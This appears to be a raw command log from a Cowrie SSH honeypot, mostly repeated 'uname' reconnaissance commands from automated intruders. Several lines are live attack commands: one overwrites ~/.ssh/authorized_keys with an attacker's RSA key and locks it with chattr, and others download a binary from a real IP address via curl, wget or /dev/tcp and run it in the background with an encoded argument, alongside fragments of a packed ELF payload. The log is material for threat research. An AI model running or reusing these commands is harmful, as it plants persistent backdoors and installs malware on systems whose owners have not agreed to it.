uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
echo 1 > /dev/null && cat /bin/echo
nohup $SHELL -c "curl http://209.177.94.88:60129/linux -o /tmp/DKFrR188pW; if [ ! -f /tmp/DKFrR188pW ]; then wget http://209.177.94.88:60129/linux -O /tmp/DKFrR188pW; fi; if [ ! -f /tmp/DKFrR188pW ]; then exec 6<>/dev/tcp/209.177.94.88/60129 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/DKFrR188pW ; chmod +x /tmp/DKFrR188pW && /tmp/DKFrR188pW zjeythV4X0mpybDsBdc51B3qs8i3XVJkCbO0Ob64I6iwDnpQS7fJs+sL3zbcBei3yalEWWQKsLQtub8mtLAbfl1Ttc229B3XLt8Y6bjOt0xZfxu4sjm+uiGosw9kUkW9zrLrH9cg3xvsrM2yU1t8Cq+0L7W5J7eyDWpYTb7Ws+0cwDnaBeK6wrFNW3gCobAjob0lsa8KfVpTtsG04B3eMd0T+rPBslNYeguvsjm+vSG8twt7WUSnybPrBdgzwB/urMG9S1p7CbGmJrq7Ob+wFXJZU7bJuOwb3zPbC+uzyalPWHMVtKgmubctsLEKe1xdtsi09B7bLt8d66zKv0dcegqysDe+tiKoswt6REmpybDsEdgw3xjjosm+T0R7D7WoJry9ObC1AXxaTLTIouMfwDHbHfSwzKlFUnANsbcjtq8ms7UVc1tTv8us6xrUNt4a6bfYvk9EeAu0qCW8vzm0sANwXE22yrH6H9ku3B7urM6+U1t5CLuwJ768IpOhZQPFntZBd+UeVDtiDowQjpwd8Dy81P6C47Yctag=; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/DKFrR188pW && /tmp/DKFrR188pW zjeythV4X0mpybDsBdc51B3qs8i3XVJkCbO0Ob64I6iwDnpQS7fJs+sL3zbcBei3yalEWWQKsLQtub8mtLAbfl1Ttc229B3XLt8Y6bjOt0xZfxu4sjm+uiGosw9kUkW9zrLrH9cg3xvsrM2yU1t8Cq+0L7W5J7eyDWpYTb7Ws+0cwDnaBeK6wrFNW3gCobAjob0lsa8KfVpTtsG04B3eMd0T+rPBslNYeguvsjm+vSG8twt7WUSnybPrBdgzwB/urMG9S1p7CbGmJrq7Ob+wFXJZU7bJuOwb3zPbC+uzyalPWHMVtKgmubctsLEKe1xdtsi09B7bLt8d66zKv0dcegqysDe+tiKoswt6REmpybDsEdgw3xjjosm+T0R7D7WoJry9ObC1AXxaTLTIouMfwDHbHfSwzKlFUnANsbcjtq8ms7UVc1tTv8us6xrUNt4a6bfYvk9EeAu0qCW8vzm0sANwXE22yrH6H9ku3B7urM6+U1t5CLuwJ768IpOhZQPFntZBd+UeVDtiDowQjpwd8Dy81P6C47Yctag=" &
head -c 3800636 > /tmp/F5HqJIXdPZ
nohup $SHELL -c "curl http://209.177.94.88:60129/linux -o /tmp/DKFrR188pW; if [ ! -f /tmp/DKFrR188pW ]; then wget http://209.177.94.88:60129/linux -O /tmp/DKFrR188pW; fi; if [ ! -f /tmp/DKFrR188pW ]; then exec 6<>/dev/tcp/209.177.94.88/60129 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/DKFrR188pW ; chmod +x /tmp/DKFrR188pW && /tmp/DKFrR188pW zjeythV4X0mpybDsBdc51B3qs8i3XVJkCbO0Ob64I6iwDnpQS7fJs+sL3zbcBei3yalEWWQKsLQtub8mtLAbfl1Ttc229B3XLt8Y6bjOt0xZfxu4sjm+uiGosw9kUkW9zrLrH9cg3xvsrM2yU1t8Cq+0L7W5J7eyDWpYTb7Ws+0cwDnaBeK6wrFNW3gCobAjob0lsa8KfVpTtsG04B3eMd0T+rPBslNYeguvsjm+vSG8twt7WUSnybPrBdgzwB/urMG9S1p7CbGmJrq7Ob+wFXJZU7bJuOwb3zPbC+uzyalPWHMVtKgmubctsLEKe1xdtsi09B7bLt8d66zKv0dcegqysDe+tiKoswt6REmpybDsEdgw3xjjosm+T0R7D7WoJry9ObC1AXxaTLTIouMfwDHbHfSwzKlFUnANsbcjtq8ms7UVc1tTv8us6xrUNt4a6bfYvk9EeAu0qCW8vzm0sANwXE22yrH6H9ku3B7urM6+U1t5CLuwJ768IpOhZQPFntZBd+UeVDtiDowQjpwd8Dy81P6C47Yctag=; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/DKFrR188pW && /tmp/DKFrR188pW zjeythV4X0mpybDsBdc51B3qs8i3XVJkCbO0Ob64I6iwDnpQS7fJs+sL3zbcBei3yalEWWQKsLQtub8mtLAbfl1Ttc229B3XLt8Y6bjOt0xZfxu4sjm+uiGosw9kUkW9zrLrH9cg3xvsrM2yU1t8Cq+0L7W5J7eyDWpYTb7Ws+0cwDnaBeK6wrFNW3gCobAjob0lsa8KfVpTtsG04B3eMd0T+rPBslNYeguvsjm+vSG8twt7WUSnybPrBdgzwB/urMG9S1p7CbGmJrq7Ob+wFXJZU7bJuOwb3zPbC+uzyalPWHMVtKgmubctsLEKe1xdtsi09B7bLt8d66zKv0dcegqysDe+tiKoswt6REmpybDsEdgw3xjjosm+T0R7D7WoJry9ObC1AXxaTLTIouMfwDHbHfSwzKlFUnANsbcjtq8ms7UVc1tTv8us6xrUNt4a6bfYvk9EeAu0qCW8vzm0sANwXE22yrH6H9ku3B7urM6+U1t5CLuwJ768IpOhZQPFntZBd+UeVDtiDowQjpwd8Dy81P6C47Yctag=" &#UPX!
>A@/1'8ELF7}
exit
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
exit
tail -f log/cowrie.log
tail -f log/cowrie.log
ls
ls -a
cd home
ls
cd ..
cd .profile
cd cowrie
whoami
pwd
cd ~
ls
pwd
whoami
cd home
ls -a
cat .profile 
cat ./ssh
exit
exit
uname -s -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -m
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
uname -s -m
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
cd /tmp ; echo uname -a > uname ; chmod 777 uname ; ./uname
uname -s -m
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -m
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
uname -s -m
uname -s -m
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
